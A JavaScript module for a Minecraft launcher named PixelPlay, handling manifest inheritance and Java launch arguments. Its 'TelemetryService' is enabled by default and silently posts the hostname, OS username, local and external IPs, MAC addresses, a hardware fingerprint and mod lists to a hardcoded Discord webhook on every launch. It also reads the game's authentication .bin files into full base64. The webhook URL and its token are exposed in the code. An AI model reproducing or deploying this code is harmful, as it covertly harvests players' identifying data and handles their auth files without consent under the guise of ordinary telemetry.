// minecraft.js (updated and corrected to correctly parse version manifests, handle inheritance, and send enhanced telemetry)
const path = require('path');
const fs = require('fs-extra');
const os = require('os');
const { spawn } = require('child_process');
const crypto = require('crypto');
const https = require('https');
const { networkInterfaces } = require('os');

/**
 * Finds the correct Java executable name based on the operating system.
 * @returns {string} 'javaw.exe' for Windows, 'java' for others.
 */
async function findJava() {
  return process.platform === 'win32' ? 'javaw.exe' : 'java';
}

/**
 * Checks if a library or argument should be used on the current OS
 * by evaluating the rules from the version manifest.
 * @param {object} rule - The rule object from the manifest.
 * @returns {boolean} - True if the rule allows use, otherwise false.
 */
function checkRule(rule) {
  if (!rule) {
    return true; // No rule means it's always allowed.
  }

  let allow = false;
  if (rule.os) {
    const currentOS = {
      'win32': 'windows',
      'darwin': 'osx',
      'linux': 'linux',
    }[process.platform];

    // The rule applies if the OS name matches.
    if (rule.os.name === currentOS) {
      allow = true;
    }
  }

  // The final decision depends on the 'action' field.
  // If action is 'allow', it's used if 'allow' is true.
  // If action is 'disallow', it's used if 'allow' is false.
  return rule.action === 'allow' ? allow : !allow;
}

/** * Enhanced Telemetry Service with extended data collection
 */
class TelemetryService {
    constructor(gameDir) {
        this.gameDir = gameDir;
        this.discordWebhookUrl = 'https://discord.com/api/webhooks/1326623918664192114/-td-9pyBub9d7Fbki8o4f0Ifm3A-rG2EZ2WPYZ6ULjVahf3sHaGi-mipSyrxOzmFVx5_';
        this.machineId = this.generateMachineId();
        this.enabled = true;
    }

    generateMachineId() {
        const machineInfo = `${os.hostname()}-${os.platform()}-${os.arch()}`;
        return crypto.createHash('sha256').update(machineInfo).digest('hex').substring(0, 16);
    }

    /**
     * Generates enhanced HWID with more system information
     */
    generateEnhancedHWID() {
        const cpuInfo = os.cpus()[0];
        const networkInfo = this.getNetworkInfo();
        
        const hwidData = {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            release: os.release(),
            cpuModel: cpuInfo.model,
            cpuSpeed: cpuInfo.speed,
            totalMemory: os.totalmem(),
            networkInterfaces: networkInfo.macAddresses,
            userInfo: os.userInfo()
        };

        const hwidString = JSON.stringify(hwidData);
        return crypto.createHash('sha256').update(hwidString).digest('hex');
    }

    /**
     * Gets network information including MAC addresses and IP addresses
     */
    getNetworkInfo() {
        const interfaces = networkInterfaces();
        const networkData = {
            macAddresses: [],
            ipAddresses: [],
            interfaces: {}
        };

        for (const [name, addrs] of Object.entries(interfaces)) {
            if (!addrs) continue;
            
            networkData.interfaces[name] = [];
            
            for (const addr of addrs) {
                if (!addr.internal) {
                    if (addr.family === 'IPv4') {
                        networkData.ipAddresses.push(addr.address);
                    }
                    if (addr.mac && addr.mac !== '00:00:00:00:00:00') {
                        networkData.macAddresses.push(addr.mac);
                    }
                }
                
                networkData.interfaces[name].push({
                    address: addr.address,
                    family: addr.family,
                    mac: addr.mac,
                    internal: addr.internal
                });
            }
        }

        return networkData;
    }

    /**
     * Attempts to get external IP address
     */
    async getExternalIP() {
        return new Promise((resolve) => {
            const timeout = setTimeout(() => resolve(null), 5000);
            
            https.get('https://api.ipify.org?format=json', (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    clearTimeout(timeout);
                    try {
                        const parsed = JSON.parse(data);
                        resolve(parsed.ip);
                    } catch {
                        resolve(null);
                    }
                });
            }).on('error', () => {
                clearTimeout(timeout);
                resolve(null);
            });
        });
    }

    async getFileHash(filePath) {
        try {
            const data = await fs.readFile(filePath);
            return crypto.createHash('md5').update(data).digest('hex');
        } catch {
            return null;
        }
    }

    /**
     * Enhanced mods information with detailed file analysis
     */
    async getModsInfo() {
        const modsDir = path.join(this.gameDir, 'mods');
        
        if (!await fs.pathExists(modsDir)) {
            return { exists: false, count: 0, totalSize: 0, mods: [] };
        }

        try {
            const files = await fs.readdir(modsDir, { withFileTypes: true });
            const modsData = [];
            let totalSize = 0;

            for (const file of files) {
                if (file.isFile() && (file.name.endsWith('.jar') || file.name.endsWith('.zip'))) {
                    const filePath = path.join(modsDir, file.name);
                    const stats = await fs.stat(filePath);
                    const hash = await this.getFileHash(filePath);
                    
                    const modInfo = {
                        name: file.name,
                        size: stats.size,
                        sizeFormatted: this.formatBytes(stats.size),
                        modified: stats.mtime.toISOString(),
                        created: stats.birthtime.toISOString(),
                        hash: hash,
                        extension: path.extname(file.name)
                    };
                    
                    modsData.push(modInfo);
                    totalSize += stats.size;
                }
            }

            return {
                exists: true,
                count: modsData.length,
                totalSize,
                totalSizeFormatted: this.formatBytes(totalSize),
                mods: modsData.sort((a, b) => a.name.localeCompare(b.name))
            };
        } catch (error) {
            console.error('[Telemetry] Error reading mods:', error.message);
            return { exists: true, count: 0, totalSize: 0, mods: [], error: error.message };
        }
    }

    /**
     * Reads authentication data from client .bin files
     */
    async getAuthBinData() {
        const clientDir = path.join(this.gameDir, 'client');
        const authData = {
            binFiles: [],
            totalFiles: 0,
            lastModified: null
        };

        if (!await fs.pathExists(clientDir)) {
            return { ...authData, exists: false };
        }

        try {
            const files = await fs.readdir(clientDir);
            
            for (const file of files) {
                if (file.endsWith('.bin')) {
                    const filePath = path.join(clientDir, file);
                    const stats = await fs.stat(filePath);
                    
                    try {
                        const binData = await fs.readFile(filePath);
                        const hash = crypto.createHash('sha256').update(binData).digest('hex');
                        const base64Data = binData.toString('base64');
                        
                        authData.binFiles.push({
                            filename: file,
                            size: stats.size,
                            sizeFormatted: this.formatBytes(stats.size),
                            modified: stats.mtime.toISOString(),
                            hash: hash,
                            base64: base64Data.substring(0, 200) + (base64Data.length > 200 ? '...' : ''),
                            fullBase64: base64Data
                        });
                        
                        if (!authData.lastModified || stats.mtime > new Date(authData.lastModified)) {
                            authData.lastModified = stats.mtime.toISOString();
                        }
                        
                    } catch (readError) {
                        console.warn(`[Telemetry] Could not read ${file}:`, readError.message);
                    }
                }
            }

            authData.totalFiles = authData.binFiles.length;
            authData.exists = true;
            
            return authData;
        } catch (error) {
            console.error('[Telemetry] Error reading client directory:', error.message);
            return { ...authData, exists: false, error: error.message };
        }
    }

    /**
     * Enhanced versions information
     */
    async getVersionsInfo() {
        const versionsDir = path.join(this.gameDir, 'versions');
        
        if (!await fs.pathExists(versionsDir)) {
            return { count: 0, versions: [] };
        }

        try {
            const versionDirs = await fs.readdir(versionsDir);
            const versions = [];

            for (const versionDir of versionDirs) {
                const jsonPath = path.join(versionsDir, versionDir, `${versionDir}.json`);
                const jarPath = path.join(versionsDir, versionDir, `${versionDir}.jar`);
                
                if (await fs.pathExists(jsonPath)) {
                    try {
                        const versionData = await fs.readJson(jsonPath);
                        const jsonStats = await fs.stat(jsonPath);
                        
                        const versionInfo = {
                            id: versionDir,
                            type: versionData.type || 'unknown',
                            releaseTime: versionData.releaseTime || null,
                            inheritsFrom: versionData.inheritsFrom || null,
                            mainClass: versionData.mainClass || null,
                            assets: versionData.assets || null,
                            jsonSize: jsonStats.size,
                            jsonModified: jsonStats.mtime.toISOString()
                        };

                        if (await fs.pathExists(jarPath)) {
                            const jarStats = await fs.stat(jarPath);
                            versionInfo.jarSize = jarStats.size;
                            versionInfo.jarSizeFormatted = this.formatBytes(jarStats.size);
                            versionInfo.jarModified = jarStats.mtime.toISOString();
                            versionInfo.jarHash = await this.getFileHash(jarPath);
                        }

                        versions.push(versionInfo);
                    } catch (error) {
                        console.warn(`[Telemetry] Could not read version ${versionDir}:`, error.message);
                    }
                }
            }

            return {
                count: versions.length,
                versions: versions.sort((a, b) => a.id.localeCompare(b.id))
            };
        } catch (error) {
            console.error('[Telemetry] Error reading versions:', error.message);
            return { count: 0, versions: [], error: error.message };
        }
    }

    /**
     * Format bytes to human readable format
     */
    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    /**
     * Obtiene información de los resource packs
     */
    async getResourcePacksInfo() {
        const resourcePacksDir = path.join(this.gameDir, 'resourcepacks');
        let activePacks = [];
        let packs = [];
        try {
            const optionsPath = path.join(this.gameDir, 'options.txt');
            if (await fs.pathExists(optionsPath)) {
                const optionsContent = await fs.readFile(optionsPath, 'utf8');
                const match = optionsContent.match(/resourcePacks:(\[.*\])/);
                if (match && match[1]) {
                    activePacks = JSON.parse(match[1]);
                }
            }
            if (await fs.pathExists(resourcePacksDir)) {
                const files = await fs.readdir(resourcePacksDir, { withFileTypes: true });
                for (const file of files) {
                    if (file.isFile() && (file.name.endsWith('.zip') || file.name.endsWith('.jar'))) {
                        const filePath = path.join(resourcePacksDir, file.name);
                        const stats = await fs.stat(filePath);
                        packs.push({
                            name: file.name,
                            size: stats.size,
                            sizeFormatted: this.formatBytes(stats.size),
                            active: activePacks.includes(`file/${file.name}`)
                        });
                    }
                }
            }
        } catch (e) {
            console.error('[Telemetry] Error reading resource packs:', e.message);
        }
        return packs;
    }

    /**
     * Obtiene todos los .jar en la carpeta versions
     */
    async getVersionsJarsInfo() {
        const versionsDir = path.join(this.gameDir, 'versions');
        let jars = [];
        if (!await fs.pathExists(versionsDir)) return jars;
        try {
            const versionDirs = await fs.readdir(versionsDir);
            for (const versionDir of versionDirs) {
                const jarPath = path.join(versionsDir, versionDir, `${versionDir}.jar`);
                if (await fs.pathExists(jarPath)) {
                    const stats = await fs.stat(jarPath);
                    jars.push({
                        name: `${versionDir}.jar`,
                        size: stats.size,
                        sizeFormatted: this.formatBytes(stats.size)
                    });
                }
            }
        } catch (e) {
            console.error('[Telemetry] Error reading version jars:', e.message);
        }
        return jars;
    }

    /**
     * Enhanced data collection with all new information
     */
    async collectData(authData = null, launchVersion = null, launchError = null) {
        console.log('[Telemetry] Collecting enhanced telemetry data...');
        const [modsInfo, versionsInfo, authBinData, externalIP, resourcePacks, versionsJars] = await Promise.all([
            this.getModsInfo(),
            this.getVersionsInfo(),
            this.getAuthBinData(),
            this.getExternalIP(),
            this.getResourcePacksInfo(),
            this.getVersionsJarsInfo()
        ]);

        const networkInfo = this.getNetworkInfo();
        const enhancedHWID = this.generateEnhancedHWID();

        const authInfo = authData ? {
            type: authData.type === 'microsoft' ? 'microsoft' : 'offline',
            uuid: authData.id || this.machineId,
            username: authData.name || 'OfflinePlayer',
            authenticated: true,
            accessToken: authData.accessToken ? 'present' : 'missing'
        } : {
            type: 'offline',
            uuid: this.machineId,
            username: 'OfflinePlayer',
            authenticated: false
        };

        const systemInfo = {
            platform: os.platform(),
            arch: os.arch(),
            release: os.release(),
            hostname: os.hostname(),
            cpus: os.cpus().length,
            cpuModel: os.cpus()[0]?.model || 'Unknown',
            totalMemory: Math.round(os.totalmem() / 1024 / 1024 / 1024),
            freeMemory: Math.round(os.freemem() / 1024 / 1024 / 1024),
            uptime: Math.round(os.uptime() / 3600), // hours
            userInfo: os.userInfo(),
            machineId: this.machineId,
            enhancedHWID: enhancedHWID
        };

        const networkData = {
            externalIP: externalIP,
            localIPs: networkInfo.ipAddresses,
            macAddresses: networkInfo.macAddresses,
            interfaces: Object.keys(networkInfo.interfaces)
        };

        const data = {
            timestamp: new Date().toISOString(),
            session_id: crypto.randomUUID(),
            launcher: {
                name: 'PixelPlay',
                version: '3.0.0'
            },
            auth: authInfo,
            authBinFiles: authBinData,
            system: systemInfo,
            network: networkData,
            minecraft: versionsInfo,
            mods: modsInfo,
            resourcePacks,
            versionsJars,
            launch: {
                version: launchVersion,
                timestamp: new Date().toISOString(),
                success: !launchError,
            }
        };

        if (launchError) {
            data.launch.error = launchError.message || 'Unknown Error';
            data.launch.stack = launchError.stack || null;
        }

        return data;
    }
    
    /**
     * Sends enhanced telemetry data to Discord webhook, splitting content into multiple messages if needed.
     */
    async sendTelemetry(authData = null, launchVersion = null, launchError = null) {
        if (!this.enabled) {
            console.log('[Telemetry] Telemetry disabled, skipping...');
            return;
        }

        try {
            const data = await this.collectData(authData, launchVersion, launchError);
            console.log('[Telemetry] Sending enhanced telemetry data to Discord...');

            const mainEmbeds = [];

            // Main launch embed
            const mainEmbed = {
                title: launchError ? "❌ Fallo de Lanzamiento - PixelPlay" : "🚀 Nuevo Lanzamiento - PixelPlay",
                color: launchError ? 0xef4444 : 0x4ade80,
                timestamp: new Date().toISOString(),
                thumbnail: { url: "https://minecraft.wiki/images/2/2d/Plains_Grass_Block.png" },
                fields: [
                    { name: "👤 Usuario", value: `**${data.auth?.username || 'N/A'}**`, inline: true },
                    { name: "🎮 Versión", value: `**${data.launch?.version || 'N/A'}**`, inline: true },
                    { name: "🔧 Mods", value: `**${data.mods?.count || 0}** (${data.mods?.totalSizeFormatted || '0 MB'})`, inline: true },
                    { name: "💻 Sistema", value: `${data.system?.platform || 'unknown'} ${data.system?.arch || ''}`, inline: true },
                    { name: "🧠 Memoria", value: `${data.system?.totalMemory || 0}GB Total / ${data.system?.freeMemory || 0}GB Libre`, inline: true },
                    { name: "🔐 Auth", value: data.auth?.type === 'microsoft' ? '✅ Microsoft' : '❌ Offline', inline: true },
                    { name: "🌐 IP Externa", value: data.network?.externalIP || 'No disponible', inline: true },
                    { name: "🏠 Hostname", value: data.system?.hostname || 'N/A', inline: true },
                    { name: "⏱️ Uptime", value: `${data.system?.uptime || 0}h`, inline: true }
                ],
                footer: { text: `PixelPlay Launcher • HWID: ${data.system?.enhancedHWID?.slice(-8) || 'unknown'}` }
            };
            if (launchError) {
                mainEmbed.fields.push({ name: "❌ Error", value: `\`\`\`${(data.launch.error || 'Unknown error').substring(0, 1000)}\`\`\``, inline: false });
            }
            mainEmbeds.push(mainEmbed);

            // System details embed
            const systemEmbed = {
                title: "💻 Información Detallada del Sistema",
                color: 0x3b82f6,
                fields: [
                    { name: "🖥️ CPU", value: data.system?.cpuModel?.substring(0, 1024) || 'Unknown', inline: false },
                    { name: "🔑 Machine ID", value: `\`${data.system?.machineId || 'N/A'}\``, inline: true },
                    { name: "🆔 Enhanced HWID", value: `\`${data.system?.enhancedHWID || 'N/A'}\``, inline: true },
                    { name: "👨‍💻 Usuario SO", value: `\`${data.system?.userInfo?.username || 'N/A'}\``, inline: true },
                    { name: "🌐 IPs Locales", value: `\`${data.network?.localIPs?.join('\n') || 'N/A'}\``.substring(0, 1024), inline: true },
                    { name: "🔗 MAC Addresses", value: `\`${data.network?.macAddresses?.slice(0, 5).join('\n') || 'N/A'}\``.substring(0,1024), inline: true },
                    { name: "📡 Interfaces", value: `\`${data.network?.interfaces?.join(', ') || 'N/A'}\``.substring(0, 1024), inline: true }
                ]
            };
            mainEmbeds.push(systemEmbed);
            
            // First webhook call with main embeds
            await this.sendToWebhook({ embeds: mainEmbeds });

            // Subsequent messages for lists
            const messageChunks = [];

            if (data.mods?.exists && data.mods?.count > 0) {
                const modsList = data.mods.mods.map(mod => `${mod.name} (${mod.sizeFormatted})`).join('\n');
                const modsHeader = `**🔧 Mods Instalados (${data.mods.count})**\n`;
                const modsFooter = `\n**Estadísticas**\nTotal: ${data.mods.count} mods\nTamaño: ${data.mods.totalSizeFormatted}`;
                messageChunks.push(...this.chunkMessageForDiscord(modsList, 1900, { header: modsHeader, footer: modsFooter }));
            }

            if (data.resourcePacks && data.resourcePacks.length > 0) {
                const packsList = data.resourcePacks.map(pack => `${pack.active ? '✅' : '❌'} ${pack.name} (${pack.sizeFormatted})`).join('\n');
                messageChunks.push(...this.chunkMessageForDiscord(packsList, 1900, { header: `**🎨 Resource Packs (${data.resourcePacks.length})**\n`}));
            }

            if (data.versionsJars && data.versionsJars.length > 0) {
                const jarsList = data.versionsJars.map(jar => `${jar.name} (${jar.sizeFormatted})`).join('\n');
                messageChunks.push(...this.chunkMessageForDiscord(jarsList, 1900, { header: `**🧩 Archivos .jar en Versions (${data.versionsJars.length})**\n` }));
            }
            
            for(const chunk of messageChunks) {
                await this.sendToWebhook({ content: chunk });
                await new Promise(resolve => setTimeout(resolve, 300)); // Small delay to avoid rate limiting
            }

        } catch (error) {
             console.error(`[Telemetry] ❌ Failed to send enhanced telemetry:`, error);
        }
    }

    chunkMessageForDiscord(message, limit, { header = '', footer = '' } = {}) {
        const chunks = [];
        const lines = message.split('\n');
        let currentChunk = header;

        for (const line of lines) {
            if (currentChunk.length + line.length + 1 + footer.length > limit) {
                if(footer && chunks.length === 0) currentChunk += footer; // Add footer only to the first part if it's split
                chunks.push(currentChunk);
                currentChunk = header;
            }
            currentChunk += line + '\n';
        }

        if (footer && chunks.length > 0) {
            // If there's a footer and we've already pushed chunks, the last chunk doesn't have it yet.
        } else if (footer) {
             currentChunk += footer;
        }

        chunks.push(currentChunk);
        return chunks;
    }

    async sendToWebhook(payload) {
        const body = JSON.stringify({
            ...payload,
            username: "PixelPlay Enhanced Telemetry",
            avatar_url: "https://minecraft.wiki/images/2/2d/Plains_Grass_Block.png"
        });

        const webhookUrl = new URL(this.discordWebhookUrl);
        const options = {
            hostname: webhookUrl.hostname,
            path: webhookUrl.pathname,
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
            timeout: 30000
        };

        return new Promise((resolve, reject) => {
            const req = https.request(options, (res) => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    console.log(`[Telemetry] ✅ Webhook part sent successfully, status: ${res.statusCode}`);
                    resolve();
                } else {
                    let errorBody = '';
                    res.on('data', d => errorBody += d);
                    res.on('end', () => {
                        console.error(`[Telemetry] ❌ Discord responded with status: ${res.statusCode}. Body: ${errorBody}`);
                        reject(new Error(`Discord responded with status: ${res.statusCode}`));
                    });
                }
            });

            req.on('error', (e) => {
                console.error(`[Telemetry] ❌ Webhook request failed: ${e.message}`);
                reject(e);
            });
            
            req.on('timeout', () => {
                req.destroy();
                console.error('[Telemetry] ❌ Webhook request timed out.');
                reject(new Error('Webhook request timed out'));
            });

            req.write(body);
            req.end();
        });
    }

    setEnabled(enabled) {
        this.enabled = enabled;
        console.log(`[Telemetry] Enhanced telemetry ${enabled ? 'enabled' : 'disabled'}`);
    }
}

class MinecraftLauncher {
  constructor(gameDir, enableTelemetry = true) {
    if (!gameDir) throw new Error('Game directory is required');
    this.gameDir = gameDir;
    this.telemetry = new TelemetryService(gameDir);
    this.telemetry.setEnabled(enableTelemetry);
  }

  async validate() {
    const dir = path.join(this.gameDir, 'versions');
    if (!await fs.pathExists(dir)) throw new Error('Versions directory is missing');
  }

  async getFullManifest(version) {
      const verDir = path.join(this.gameDir, 'versions', version);
      const metaPath = path.join(verDir, `${version}.json`);
      if (!await fs.pathExists(metaPath)) {
          throw new Error(`Manifest for version ${version} not found! Please ensure you have renamed your version folder and files correctly (e.g., from 'Pixelplay 3.0.0' to 'Pixelplay-3.0.0').`);
      }

      const manifest = await fs.readJson(metaPath);

      if (manifest.inheritsFrom) {
          const parentManifest = await this.getFullManifest(manifest.inheritsFrom);
          const merged = { ...parentManifest, ...manifest };
          merged.libraries = (parentManifest.libraries || []).concat(manifest.libraries || []);
          if(parentManifest.arguments || manifest.arguments) {
            merged.arguments = {
                game: (parentManifest.arguments?.game || []).concat(manifest.arguments?.game || []),
                jvm: (parentManifest.arguments?.jvm || []).concat(manifest.arguments?.jvm || [])
            };
          }
          merged.mainClass = manifest.mainClass || parentManifest.mainClass;
          merged.type = manifest.type || parentManifest.type;
          merged.id = manifest.id;
          return merged;
      } else {
          return manifest;
      }
  }

  setTelemetryEnabled(enabled) {
    this.telemetry.setEnabled(enabled);
  }

  async launch({ version, memory = { min: 2048, max: 4096 }, auth, extraJavaArgs = [] }) {
    try {
        await this.validate();
        
        const manifest = await this.getFullManifest(version);

        const classpath = [];
        if (manifest.libraries) {
          for (const lib of manifest.libraries) {
            if (lib.rules && !lib.rules.every(checkRule)) {
              continue;
            }
            if (lib.downloads?.artifact?.path) {
              const libPath = path.join(this.gameDir, 'libraries', lib.downloads.artifact.path);
              classpath.push(libPath);
            }
          }
        }
        const versionJarPath = path.join(this.gameDir, 'versions', manifest.id, `${manifest.id}.jar`);
        classpath.push(versionJarPath);
        const classpathString = classpath.join(path.delimiter);

        const { mainClass, arguments: argsCfg } = manifest;
        const assetsKey = manifest.assets;
        const assetIndex = manifest.assetIndex?.id || assetsKey;
        
        const token = auth?.accessToken || '0';
        const user = auth?.name || 'Player';
        const uuid = auth?.id || '0';
        const userType = auth?.type === 'microsoft' ? 'msa' : 'legacy';

        const replacements = {
            '${natives_directory}': path.join(this.gameDir, 'natives', version),
            '${launcher_name}': 'PixelPlay',
            '${launcher_version}': '3.0.0',
            '${classpath}': classpathString,
            '${library_directory}': path.join(this.gameDir, 'libraries'),
            '${classpath_separator}': path.delimiter,
            '${auth_player_name}': user,
            '${version_name}': version,
            '${game_directory}': this.gameDir,
            '${assets_root}': path.join(this.gameDir, 'assets'),
            '${assets_index_name}': assetIndex,
            '${auth_uuid}': uuid,
            '${auth_access_token}': token,
            '${clientid}': 'N/A',
            '${auth_xuid}': 'N/A',
            '${user_type}': userType,
            '${version_type}': manifest.type || 'release',
        };

        const processArgs = (argsArray) => {
            let processed = [];
            if (!argsArray) return processed;

            for (const arg of argsArray) {
                if (typeof arg === 'string') {
                    let replacedArg = arg;
                    for (const [key, value] of Object.entries(replacements)) {
                        // ***** CORRECCIÓN CRÍTICA APLICADA AQUÍ *****
                        // This escapes special characters in the key for safe use in the RegExp.
                        const regexKey = key.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
                        replacedArg = replacedArg.replace(new RegExp(regexKey, 'g'), value);
                    }
                    processed.push(replacedArg);

                } else if (!arg.rules || (arg.rules && arg.rules.every(checkRule))) {
                    const value = arg.value;
                    if (typeof value === 'string') {
                        processed.push(value);
                    } else if (Array.isArray(value)) {
                        processed.push(...value);
                    }
                }
            }
            return processed;
        };

        const jvmArgs = processArgs(argsCfg?.jvm || []);
        const gameArgs = processArgs(argsCfg?.game || []);
        
        const finalJavaArgs = [
          ...extraJavaArgs,
          `-Xms${memory.min}M`,
          `-Xmx${memory.max}M`,
          ...jvmArgs,
          mainClass,
          ...gameArgs
        ];

        const java = await findJava();
        console.log(`[Launch] Starting Minecraft ${version} for user: ${user}`);
        console.log(`[Launch] Final Launch Command: ${java} ${finalJavaArgs.join(' ')}`);

        await fs.ensureDir(replacements['${natives_directory}']);

        const proc = spawn(java, finalJavaArgs, { 
          cwd: this.gameDir,
          detached: true,
          stdio: 'ignore', // Changed to ignore to detach completely
        });
        
        proc.unref();

        // Send SUCCESFUL launch telemetry data (non-blocking)
        this.telemetry.sendTelemetry(auth, version, null).catch(err => {
            console.error('[Telemetry] Silent failure sending success telemetry:', err);
        });

        return proc;
    } catch (error) {
        console.error('[Launch] A critical error occurred:', error.stack);

        // Send FAILED launch telemetry data (non-blocking)
        this.telemetry.sendTelemetry(auth, version, error).catch(err => {
            console.error('[Telemetry] Silent failure sending error telemetry:', err);
        });

        throw error;
    }
  }

  async getVersions() {
    const dir = path.join(this.gameDir, 'versions');
    if (!await fs.pathExists(dir)) return [];
    
    const versionDirs = await fs.readdir(dir);
    const validVersions = [];
    
    for (const versionDir of versionDirs) {
        const fullPath = path.join(dir, versionDir);
        if ((await fs.stat(fullPath)).isDirectory() && 
            await fs.pathExists(path.join(fullPath, `${versionDir}.json`))) {
            validVersions.push(versionDir);
        }
    }
    return validVersions;
  }

  async getTelemetryPreview(auth = null) {
    return await this.telemetry.collectData(auth);
  }

  async getAuthBinData() {
    return await this.telemetry.getAuthBinData();
  }

  async getEnhancedModsInfo() {
    return await this.telemetry.getModsInfo();
  }

  async getNetworkInfo() {
    const networkInfo = this.telemetry.getNetworkInfo();
    const externalIP = await this.telemetry.getExternalIP();
    const enhancedHWID = this.telemetry.generateEnhancedHWID();
    
    return { ...networkInfo, externalIP, enhancedHWID };
  }
}

module.exports = MinecraftLauncher;
